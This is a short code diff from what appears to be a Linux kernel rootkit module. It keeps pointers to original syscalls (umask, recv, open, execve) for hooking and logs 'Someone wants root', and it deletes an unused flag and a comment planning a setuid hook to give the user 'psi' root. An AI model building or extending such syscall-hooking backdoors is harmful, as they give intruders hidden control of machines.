@@ -15,7 +15,6 @@
 #include <linux/init.h>
 #include <linux/rtc.h>
 #include "netfilter.h"
-int unlocked = 0;
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tyl3rdurd3n");
@@ -39,7 +38,6 @@ asmlinkage int (*original_umask)(mode_t umask);
 asmlinkage long (*original_recv)(int, void __user *, size_t, unsigned);
 asmlinkage long (*original_sys_open)(const char __user *, int, umode_t);
 asmlinkage int (*original_execve)(const char* file,const char* const argv[],const char* const envp[]);
-
 
 
 /* 			HOOKING FUNCTIONS				*/
@@ -74,10 +72,6 @@ asmlinkage int psi_execve(const char *file, const char *const argv[], const char
 	return original_execve(file, argv, envp);
 }
 
-
-
-
-// Should hook the setuid function to always work for username psi
 asmlinkage int psi_umask(mode_t umask){
 	printk(KERN_NOTICE "[Ψe]: Someone wants root");
 	return original_umask(umask);
